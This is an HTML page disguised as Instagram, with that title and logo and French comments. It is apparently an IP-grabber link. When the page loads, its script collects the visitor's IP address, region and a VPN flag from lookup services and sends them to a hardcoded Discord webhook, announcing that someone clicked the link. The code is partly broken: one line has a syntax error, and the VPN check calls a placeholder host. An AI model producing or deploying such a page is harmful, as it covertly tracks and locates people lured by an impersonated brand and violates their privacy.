<!DOCTYPE html>
<html lang="fr">
<head>
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
  <script>
    // Fonction pour envoyer l'adresse IP, le d√©partement et l'indicateur VPN √† Discord via un appel de webhook
    function sendIPDepartmentAndVPNToDiscord(ipAddress, department, isVPN) {
      var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";

      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations re√ßues :**" +
        "\n> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
        "\n> **R√©gion üè† : **" + department +
        "\n> **VPN üîí : **" + (IP sous VPN ? "Oui" : "Non");

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour r√©cup√©rer l'adresse IP, le d√©partement et d√©tecter si l'adresse IP provient d'un VPN
    function getIPAddressDepartmentAndVPN() {
      // R√©cup√©rer l'adresse IP de l'utilisateur en utilisant un service de g√©olocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // R√©cup√©rer le d√©partement en fonction de l'adresse IP
          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var department = data.region;

              // D√©tecter si l'adresse IP provient d'un VPN
              fetch('https://api.example.com/check/vpn?ip=' + ipAddress)
                .then(response => response.json())
                .then(vpnData => {
                  var isVPN = vpnData.is_vpn;

                  // Envoyer l'adresse IP, le d√©partement et l'indicateur VPN √† Discord
                  sendIPDepartmentAndVPNToDiscord(ipAddress, department, isVPN);
                })
                .catch(error => {
                  console.error('Erreur lors de la d√©tection de VPN :', error);
                });
            })
            .catch(error => {
              console.error('Erreur lors de la r√©cup√©ration du d√©partement :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
        });
    }

    // Appeler la fonction d√®s que la page est charg√©e
    window.addEventListener('load', getIPAddressDepartmentAndVPN);
  </script>
</head>
<body>
</body>
</html>
